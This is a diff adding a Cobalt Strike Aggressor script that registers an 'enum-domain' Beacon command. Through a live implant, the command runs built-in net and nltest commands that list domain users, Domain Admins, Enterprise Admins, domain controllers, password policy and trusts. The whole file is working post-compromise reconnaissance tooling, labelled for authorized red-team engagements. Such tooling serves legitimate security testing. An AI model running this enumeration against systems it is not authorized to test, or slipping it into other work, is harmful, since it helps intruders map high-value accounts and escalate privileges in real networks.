@@ -1,0 +1,50 @@
+#
+# domain-enum.cna - Active Directory / domain enumeration
+#
+# Registers the `enum-domain` Beacon alias. Pulls domain, trust, user,
+# group, and policy information using native `net` commands plus nltest.
+# Pure living-off-the-land; no tooling dropped.
+#
+# FOR USE ON AUTHORIZED RED TEAM ENGAGEMENTS ONLY.
+#
+
+sub enum_domain {
+    local('$bid @cmds');
+    $bid = $1;
+
+    enum_log($bid, "domain enumeration starting");
+
+    @cmds = @(
+        "net config workstation",
+        "echo %USERDOMAIN%  %LOGONSERVER%",
+        "net user /domain",
+        "net group \"Domain Admins\" /domain",
+        "net group \"Enterprise Admins\" /domain",
+        "net group \"Domain Controllers\" /domain",
+        "net accounts /domain",
+        "nltest /domain_trusts",
+        "nltest /dclist:%USERDOMAIN%",
+        "net localgroup administrators /domain"
+    );
+
+    enum_run_each($bid, @cmds);
+    enum_log($bid, "domain enumeration queued");
+}
+
+alias enum-domain {
+    enum_domain($1);
+}
+
+beacon_command_register(
+    "enum-domain",
+    "Active Directory / domain situational awareness",
+    "Synopsis: enum-domain\n\n" .
+    "Collects AD context using built-in Windows commands:\n" .
+    "  net config workstation   - workstation / domain membership\n" .
+    "  net user /domain         - all domain users\n" .
+    "  net group (DA/EA/DCs)    - high-value group membership\n" .
+    "  net accounts /domain     - password policy\n" .
+    "  nltest /domain_trusts    - forest/domain trusts\n" .
+    "  nltest /dclist           - domain controller list\n\n" .
+    "No binaries are dropped. Runs via cmd.exe through the current Beacon."
+);
